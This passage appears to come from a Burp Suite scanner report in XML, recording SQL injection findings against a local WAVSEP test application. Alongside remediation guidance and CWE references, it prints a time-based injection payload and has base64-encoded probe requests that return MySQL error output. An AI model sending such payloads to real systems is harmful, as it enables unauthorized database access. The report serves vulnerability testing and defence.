      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3ItRXhwZXJpbWVudGFsL0Nhc2UwMS1JbmplY3Rpb25Jbkluc2VydFZhbHVlcy1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoMjAwRXJyb3JzLmpzcD9tc2c9cmVhZG1lJnRhcmdldD1hQGEuY29tJycgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogbm9uZQ0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAwOjI3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NzQNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBzdHJpbmcgdmFsdWVzIGluIGFuIGluc2VydCAodmFsdWVzKSBzdGF0ZW1lbnQgd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCjwhLS0KCUluc3BpcmVkIGJ5IGEgdnVsbmVyYWJsZSB0ZXN0IGNhc2Ugb3JpZ2luYWxseSB3cml0dGVuIGZvciB0aGUgT1dBU1AgWmVkIEF0dGFjayBQcm94eSAoWkFQKSBwcm9qZWN0CgkoaHR0cDovL3d3dy5vd2FzcC5vcmcvaW5kZXgucGhwL09XQVNQX1plZF9BdHRhY2tfUHJveHlfUHJvamVjdCkgCglPcmlnaW5hbCBBdXRob3I6IHBzaWlub24gKHBzaWlub25AZ21haWwuY29tKS4KLS0+CgpRdWVyeSBleGVjdXRlZAoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3ItRXhwZXJpbWVudGFsL0Nhc2UwMS1JbmplY3Rpb25Jbkluc2VydFZhbHVlcy1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoMjAwRXJyb3JzLmpzcD9tc2c9cmVhZG1lJnRhcmdldD1hQGEuY29tMjg5NDMyNDgnJTIwb3IlMjAxMDQ3JTNkMTA0Ny0tJTIwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IG5vbmUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNzU5DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAwOjI3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBzdHJpbmcgdmFsdWVzIGluIGFuIGluc2VydCAodmFsdWVzKSBzdGF0ZW1lbnQgd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCjwhLS0KCUluc3BpcmVkIGJ5IGEgdnVsbmVyYWJsZSB0ZXN0IGNhc2Ugb3JpZ2luYWxseSB3cml0dGVuIGZvciB0aGUgT1dBU1AgWmVkIEF0dGFjayBQcm94eSAoWkFQKSBwcm9qZWN0CgkoaHR0cDovL3d3dy5vd2FzcC5vcmcvaW5kZXgucGhwL09XQVNQX1plZF9BdHRhY2tfUHJveHlfUHJvamVjdCkgCglPcmlnaW5hbCBBdXRob3I6IHBzaWlub24gKHBzaWlub25AZ21haWwuY29tKS4KLS0+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJycgYXQgbGluZSAxCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3212139946501777408</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp [password parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>password</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the password parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the password parameter. The application took <b>20010</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTAxLUluamVjdGlvbkluTG9naW4tU3RyaW5nLUxvZ2luQnlwYXNzLVdpdGgyMDBFcnJvcnMuanNwP3VzZXJuYW1lPXRleHR2YWx1ZSZwYXNzd29yZD10ZXh0dmFsdWUyJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTMzDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBzdHJpbmcgdmFsdWVzIGluIGEgbG9naW4gcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICcndGV4dHZhbHVlMicnJyBhdCBsaW5lIDEKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTAxLUluamVjdGlvbkluTG9naW4tU3RyaW5nLUxvZ2luQnlwYXNzLVdpdGgyMDBFcnJvcnMuanNwP3VzZXJuYW1lPXRleHR2YWx1ZSZwYXNzd29yZD10ZXh0dmFsdWUyJycgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzMNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBzdHJpbmcgdmFsdWVzIGluIGEgbG9naW4gcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKbG9naW4gZmFpbGVkCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTAxLUluamVjdGlvbkluTG9naW4tU3RyaW5nLUxvZ2luQnlwYXNzLVdpdGgyMDBFcnJvcnMuanNwP3VzZXJuYW1lPXRleHR2YWx1ZSZwYXNzd29yZD10ZXh0dmFsdWUyJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYicgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjI2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzMNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBzdHJpbmcgdmFsdWVzIGluIGEgbG9naW4gcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKbG9naW4gZmFpbGVkCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1093278914332607488</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp [username parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>username</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the username parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the username parameter. The application took <b>20008</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTAxLUluamVjdGlvbkluTG9naW4tU3RyaW5nLUxvZ2luQnlwYXNzLVdpdGgyMDBFcnJvcnMuanNwP3VzZXJuYW1lPXRleHR2YWx1ZScmcGFzc3dvcmQ9dGV4dHZhbHVlMiBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
